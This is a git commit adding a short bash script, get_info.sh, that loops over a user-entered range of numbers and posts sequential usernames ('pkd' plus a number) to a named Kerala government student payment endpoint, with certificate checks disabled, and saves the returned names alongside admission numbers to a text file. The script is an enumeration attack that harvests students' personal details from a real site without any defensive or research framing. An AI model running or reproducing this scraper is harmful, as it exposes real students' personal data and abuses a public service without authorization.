2f9c5a4382192691e26cdd98d0b440a803d75414
Sheheer Ali <67970285+SHEHEERALIZX@users.noreply.github.com>
2021-11-26 21:12:43 +0530

    Create get_info.sh

---
+++ get_info.sh
@@ -0,0 +1,22 @@
+ 
+ echo "Enter the Starting Range :"  
+ read StartRange
+ echo "Enter the Ending Range :"  
+ read EndRange
+
+
+
+
+for ((i = $StartRange ; i <= $EndRange ; i++)) 
+do
+
+  curl -k -X POST -d  "username=pkd$i" https://digipay.dtekerala.gov.in/netbank/index.php/student/loadgetname_u >> text.txt
+  
+  
+  echo >> text.txt
+  echo "            Username : pkd$i" >> text.txt
+  echo "            Admission NO  : $i" >> text.txt
+
+  echo "  " >> text.txt
+
+done
